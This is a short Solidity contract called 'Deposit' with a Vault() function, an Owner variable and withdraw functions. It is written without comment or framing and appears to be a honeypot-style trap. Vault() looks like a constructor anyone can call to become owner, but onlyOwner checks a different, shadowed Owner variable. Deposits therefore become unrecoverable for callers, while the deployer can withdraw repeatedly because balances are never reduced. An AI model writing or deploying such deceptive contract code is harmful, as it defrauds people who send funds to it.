1 pragma solidity ^0.4.8;
2 
3 contract ForeignToken {
4     function balanceOf(address who) constant public returns (uint256);
5     function transfer(address to, uint256 amount) public;
6 }
7 
8 contract Owned {
9     address public Owner = msg.sender;
10     modifier onlyOwner { if (msg.sender == Owner) _; }
11 }
12 
13 contract Deposit is Owned {
14     address public Owner;
15     mapping (address => uint) public Deposits;
16 
17     event Deposit(uint amount);
18     event Withdraw(uint amount);
19     
20     function Vault() payable {
21         Owner = msg.sender;
22         deposit();
23     }
24     
25     function() payable {
26         deposit();
27     }
28 
29     function deposit() payable {
30         if (msg.value >= 0.1 ether) {
31             Deposits[msg.sender] += msg.value;
32             Deposit(msg.value);
33         }
34     }
35 
36     function kill() payable {
37         if (this.balance == 0)
38             selfdestruct(msg.sender);
39     }
40     
41     function withdraw(uint amount) payable onlyOwner {
42         if (Deposits[msg.sender] > 0 && amount <= Deposits[msg.sender]) {
43             msg.sender.send(amount);
44             Withdraw(amount);
45         }
46     }
47     
48     function withdrawToken(address token, uint amount) payable onlyOwner {
49         uint bal = ForeignToken(token).balanceOf(address(this));
50         if (bal >= amount) {
51             ForeignToken(token).transfer(msg.sender, amount);
52         }
53     }
54 }